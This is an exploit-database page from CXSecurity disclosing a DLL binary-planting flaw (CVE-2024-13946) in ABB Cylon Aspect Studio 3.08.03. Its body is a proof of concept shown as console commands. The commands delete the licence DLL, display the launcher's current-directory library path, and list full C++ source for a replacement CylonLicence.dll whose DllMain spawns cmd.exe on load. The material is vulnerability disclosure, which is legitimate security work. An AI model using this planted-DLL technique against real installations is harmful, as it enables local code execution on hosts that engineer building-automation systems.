---
title: ABB Cylon Aspect Studio 3.08.03 Binary Planting
url: https://cxsecurity.com/issue/WLB-2025050050
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-28
fetch_date: 2025-10-06T22:25:13.225932
---

# ABB Cylon Aspect Studio 3.08.03 Binary Planting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ABB Cylon Aspect Studio 3.08.03 Binary Planting** **2025.05.27**  Credit:  **[Gjoko 'LiquidWorm' Krstic](https://cxsecurity.com/author/Gjoko%2B%26%23039%3BLiquidWorm%26%23039%3B%2BKrstic/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2024-13946](https://cxsecurity.com/cveshow/CVE-2024-13946/ "Click to see CVE-2024-13946")**  CWE: **N/A** | |

# Exploit Title: ABB Cylon Aspect Studio 3.08.03 - Binary Planting
# Vendor: ABB Ltd.
# Product web page: https://www.global.abb
# Affected version: <=3.08.03
# Tested on: Microsoft Windows 10 Home (EN) OpenJDK 64-Bit Server VM Temurin-21.0.6+7
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic @zeroscience
# Advisory ID: ZSL-2025-5952
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5952.php
# CVE ID: CVE-2024-13946
# CVE URL: https://www.cve.org/CVERecord/SearchResults?query=CVE-2024-13946
C:\> type project
P R O J E C T
.|
| |
|'| .\_\_\_\_\_
\_\_\_ | | |. |' .---"|
\_ .-' '-. | | .--'| || | \_| |
.-'| \_.| | || '-\_\_ | | | || |
|' | |. | || | | | | || |
\_\_\_\_| '-' ' "" '-' '-.' '` |\_\_\_\_
░▒▓███████▓▒░░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░▒▓███████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓███████▓▒░░▒▓███████▓▒░░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓██████▓▒░
░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░
░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░
░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░░░░░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░░░░░░░▒▓██████▓▒░ ░▒▓██████▓▒░
C:\Aspect\Aspect-Studio-3.08.03> del CylonLicence.dll
C:\Aspect\Aspect-Studio-3.08.03> type aspect.bat
REM 64bit parameters
jre\bin\javaw -Dormlite.networkpoint.load=true -Dfile.encoding="UTF-8" -DlookAndFeel=nimbus -DMapGraphic.forceLoad=0 -DBACnet.discovery.driverPort=4224 -DBACnet.discovery.debugLevel=0 -Djava.library.path=. -DportPool.maxPortWaitTime=10000 -DOverride.enabled=false -Dlog4j.configuration=./log4j.aspectstudio.properties -Dswing.noxp=true -Dsun.java2d.d3d=false -Dsun.java2d.noddraw=true -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:InitiatingHeapOccupancyPercent=25 -Xss256k -Xms1024m -Xmx4096m -jar AspectStudioObf.jar
C:\Aspect\Aspect-Studio-3.08.03-a09>aspect.bat
C:\Aspect\Aspect-Studio-3.08.03-a09>REM 64bit parameters
C:\Aspect\Aspect-Studio-3.08.03-a09>jre\bin\javaw -Dormlite.networkpoint.load=true -Dfile.encoding="UTF-8" -DlookAndFeel=nimbus -DMapGraphic.forceLoad=0 -DBACnet.discovery.driverPort=4224 -DBACnet.discovery.debugLevel=0 -Djava.library.path=. -DportPool.maxPortWaitTime=10000 -DOverride.enabled=false -Dlog4j.configuration=./log4j.aspectstudio.properties -Dswing.noxp=true -Dsun.java2d.d3d=false -Dsun.java2d.noddraw=true -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:InitiatingHeapOccupancyPercent=25 -Xss256k -Xms1024m -Xmx4096m -jar AspectStudioObf.jar
C:\Aspect\Aspect-Studio-3.08.03> type AspectStudio.class
...
...
System.loadLibrary("CylonLicence");
} catch (Throwable t) {}
LoggerUtil.logger.error("Error loading license DLL", t);
}
}
...
...
C:\Aspect\Aspect-Studio-3.08.03> cd logs
C:\Aspect\Aspect-Studio-3.08.03\logs>type AspectStudio.log
ERROR: 2025-01-16 16:47:58,579 Error loading license DLL [main]
java.lang.UnsatisfiedLinkError: no CylonLicence in java.library.path
at java.lang.ClassLoader.loadLibrary(ClassLoader.java:1867)
at java.lang.Runtime.loadLibrary0(Runtime.java:870)
at java.lang.System.loadLibrary(System.java:1122)
at com.aamatrix.util.AspectStudio.<clinit>(AspectStudio.java:42)
at com.aamatrix.vib.rrobin.CylonLicense.<init>(CylonLicense.java:18)
at com.aamatrix.vib.rrobin.LicenseService.<init>(LicenseService.java:38)
at com.aamatrix.vib.rrobin.LicenseService.<clinit>(LicenseService.java:34)
at com.aamatrix.projectmanager.AspectStudio.<clinit>(AspectStudio.java:52)
at java.lang.Class.forName0(Native Method)
at java.lang.Class.forName(Class.java:348)
at com.aamatrix.projectmanager.AspectStudioLauncher.main(AspectStudioLauncher.java:70)
...
...
C:\DLL-Mala> type CylonLicence.cpp
#define WIN32\_LEAN\_AND\_MEAN
#include <windows.h>
#include <shellapi.h>
extern "C" \_\_declspec(dllexport)
DWORD WINAPI ExecuteCmdThread(LPVOID lpParam) {
ShellExecuteW(NULL, L"open", L"cmd.exe", L"/c start", NULL, SW\_SHOWNORMAL);
return 0;
}
extern "C" \_\_declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
DWORD ul\_reason\_for\_call,
LPVOID lpReserved) {
switch (ul\_reason\_for\_call) {
case DLL\_PROCESS\_ATTACH:
CreateThread(NULL, 0, ExecuteCmdThread, NULL, 0, NULL);
break;
case DLL\_THREAD\_ATTACH:
case DLL\_THREAD\_DETACH:
case DLL\_PROCESS\_DETACH:
break;
}
return TRUE;
}

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050050)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top